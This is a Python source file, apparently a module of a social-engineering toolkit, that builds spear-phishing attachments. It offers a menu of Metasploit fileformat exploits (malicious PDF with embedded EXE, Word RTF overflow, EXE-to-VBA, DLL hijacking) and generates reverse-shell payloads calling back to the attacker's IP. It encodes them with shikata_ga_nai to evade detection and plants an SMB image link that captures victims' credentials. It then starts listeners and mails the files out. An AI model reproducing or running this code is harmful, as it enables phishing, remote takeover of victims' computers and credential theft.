#!/usr/bin/python
# PDF spear phishing attack here

import subprocess
import re
import sys
import os
import socket
import pexpect
import time
from src.core.core import *    ## j0fer 7-10-2011 See notes below
from src.core.dictionaries import *
from src.core.menu.text import *

definepath=os.getcwd()

# grab central repositories
sys.path.append("src/core/")
try: reload(core)
except: import core

define_version = get_version()

# metasploit path 
meta_path=core.meta_path()

# define if we need apache or not for dll hijacking
# define if use apache or not
apache=0

# open set_config
apache_check=file("%s/config/set_config" % (definepath),"r").readlines()

# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line=line.rstrip()
    # if apache is turned on get things ready
    match=re.search("APACHE_SERVER=ON",line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2=re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2=line2.rstrip()
                apache_path=line2.replace("APACHE_DIRECTORY=","")
                apache=1

show_banner(define_version,0)
print create_payloads_text 

###################################################
#        USER INPUT: SHOW PAYLOAD MENU            #
###################################################   

for i,option in enumerate(create_payloads_menu):
    menunum=i + 1
    print('    %s. %s' % (menunum,option))

exploit=raw_input("\n   Enter the number you want (press enter for default): ")

inputpdf=""
target=""

# Do conditional checks for the value of 'exploit', which should be a number
# Handle any additional tasks before doing the dictionary lookup and
# converting the user returned value to the metasploit string
# here we specify if its a pdf or rtf

if exploit == "":
    exploit='1'        # 'SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)'

if exploit == '3':     #'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow'
    outfile=("template.doc")

if exploit == '4':     #'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)' 
    outfile=("template.rtf")
    target=("TARGET=1")

if exploit != '3' and exploit != '4': 
    outfile=("template.pdf")

exploit=ms_attacks(exploit)

# 'exploit' has been converted to the string by now, so we need to
#  evaluate the string instead of the user input number from here on... 
if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs":
    print "   You have selected the default payload creation. SET will generate a normal PDF with embedded EXE."
    choicepdf=raw_input("""
    1. Use your own PDF for attack
    2. Use built-in BLANK PDF for attack

   Enter your choice (return for default): """)
    if choicepdf == '1':
        # define if user wants to use their own pdf or built in one
        inputpdf=raw_input("   Enter path to your pdf (enter for default): ")
        # if blank, then default to normal pdf
        if inputpdf == "":
            # change to default SET pdf
            print "   [*] Defaulting to BLANK PDF built into SET..."
            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
        # if no file exists defalt this
        if not os.path.isfile(inputpdf):
            print "   [*] Unable to find PDF, defaulting to blank PDF."
            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
        # if pdf exists, we are good
        if os.path.isfile(inputpdf):
            inputpdf="INFILENAME="+inputpdf

    if choicepdf == '2':
        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"

    if choicepdf == "":
        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"

exploit_counter=0

if exploit == "dll_hijacking" or exploit == "unc_embed":
    exploit_counter=1

if exploit_counter == 0:
    
    ###################################################
    #        USER INPUT: SHOW PAYLOAD MENU 3          #
    ###################################################   
    
    for i,option in enumerate(payload_menu_3):
        menunum=i + 1
        print('    %s. %s' % (menunum,option))    # draw menu here

    payload=raw_input("   Enter the payload you want (press enter for default): ")
    noencode=0
    
    if payload == "" : payload=2 
    if payload == '4' or payload == '5' or payload == '6':
        noencode=1
 
    payload=ms_payload_3(payload)
    

    # imported from central, grabs ip address
    rhost=core.grab_ipaddress()

    # SET LPORT
    lport=raw_input("Enter the port to connect back on (press enter for default): ")

    # if blank default to 443
    if lport == "":
        lport="443"
        print "[*] Defaulting to port 443..."

    # SET FILE OUTPATH
    outpath=("%s/src/program_junk/" % (definepath))
    print "[*] Generating fileformat exploit..."
    # START THE EXE TO VBA PAYLOAD
    if exploit != 'custom/exe/to/vba/payload':
        outfile = "src/program_junk/" + outfile
        subprocess.Popen("ruby %s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E 1> /dev/null 2> /dev/null" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), shell=True).wait()
        print """[*] Payload creation complete.\n[*] All payloads get sent to the src/program_junk/%s directory""" % (outfile)
    if exploit == 'custom/exe/to/vba/payload':
        # Creating Payload here
        # if not 64 specify raw output and filename of vb1.exe
        if noencode == 0:
            execute1=("R")
            payloadname=("vb1.exe")
        if noencode == 1:
            execute1=("X")
            payloadname=("vb.exe")
        subprocess.Popen("ruby %s/msfpayload %s %s %s ENCODING=shikata_ga_nai %s > src/program_junk/%s" % (meta_path,payload,rhost,lport,execute1,payloadname), shell=True).wait()
        if noencode == 0:
            subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i src/program_junk/vb1.exe -o src/program_junk/vb.exe -t exe -c 3" % (meta_path), shell=True).wait()
        # Create the VB script here
        subprocess.Popen("%s/tools/exe2vba.rb src/program_junk/vb.exe src/program_junk/template.vbs" % (meta_path), shell=True).wait()
        print "Raring the VBS file."
        subprocess.Popen("rar a src/program_junk/template.rar src/program_junk/template.vbs", shell=True).wait()

    # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
    filewrite=file("src/program_junk/payload.options","w")
    filewrite.write(payload+" "+rhost+" "+lport)
    filewrite.close()
    if exploit != "dll_hijacking":
        if not os.path.isfile("src/program_junk/fileformat.file"):
            sys.path.append("src/phishing/smtp/client/")
            try: reload(smtp_client)
            except: import smtp_client

# start the unc_embed attack stuff here
if exploit == "unc_embed":
    rhost=core.grab_ipaddress
    import string,random
    def random_string(minlength=6,maxlength=15):
        length=random.randint(minlength,maxlength)
        letters=string.ascii_letters+string.digits
        return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()
    filewrite=file("src/program_junk/unc_config", "w")
    filewrite.write("use server/capture/smb\n")
    filewrite.write("exploit -j\n\n")
    filewrite.close()
    filewrite=file("src/program_junk/template.doc", "w")
    filewrite.write(r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' %(rhost,rand_gen))
    filewrite.close()
    sys.path.append("src/phishing/smtp/client/")
    try: reload(smtp_client)
    except: import smtp_client

# start the dll_hijacking stuff here
if exploit == "dll_hijacking":
    sys.path.append("src/core/payloadgen")
    try: reload(payloadgen)
    except: import payloadgen

    sys.path.append("src/webattack/dll_hijacking")
    try: reload(hijacking)
    except: import hijacking

    # if we are not using apache
    if apache == 0:
        if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
    #        try:
                filewrite=file("src/program_junk/attack_vector","w")
                filewrite.write("hijacking")
                filewrite.close()
                filewrite=file("src/program_junk/site.template","w")
                filewrite.write("TEMPLATE=CUSTOM")
                filewrite.close()
                time.sleep(1)
                subprocess.Popen("mkdir src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null;cp src/html/msf.exe src/webattack/web_clone/site/template/x 1> /dev/null 2> /dev/null", shell=True).wait()
                child=pexpect.spawn("python src/html/web_server.py")
    #        except: child.close()
    # if we are using apache    
    if apache == 1:
        subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()

    if os.path.isfile("src/program_junk/meta_config"):
        # if we aren't using the infectious method then do normal routine
        if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
            print core.bcolors.BLUE + "[*] This may take a few to load MSF..." + core.bcolors.ENDC
            try:
                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path))
            except: 
                try:
                    child1.close()
                except: pass

    # get the emails out
    # if we aren't using the infectious method then do the normal routine
    if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
        sys.path.append("src/phishing/smtp/client/")
        try: reload(smtp_client)
        except: import smtp_client
        try:
            child1.interact()
        except: 
            if apache == 0:
                try:
                    child.close()
                    child1.close()
                except: pass
